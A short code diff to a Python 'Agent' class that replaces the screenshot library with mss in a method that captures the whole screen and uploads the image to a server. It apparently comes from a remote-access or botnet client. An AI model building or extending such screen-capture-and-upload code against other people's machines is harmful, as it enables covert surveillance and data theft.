@@ -16,10 +16,7 @@ import zipfile
 import tempfile
 import socket
 import getpass
-if os.name == 'nt':
-    from PIL import ImageGrab
-else:
-    import pyscreenshot as ImageGrab
+import mss
 import ctypes
 
 import config
@@ -238,11 +235,11 @@ class Agent(object):
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
-        screenshot = ImageGrab.grab()
         tmp_file = tempfile.NamedTemporaryFile()
         screenshot_file = tmp_file.name + ".png"
         tmp_file.close()
-        screenshot.save(screenshot_file)
+        with mss.mss() as sct:
+            sct.shot(mon=-1, output=screenshot_file)
         self.upload(screenshot_file)
 
     @threaded
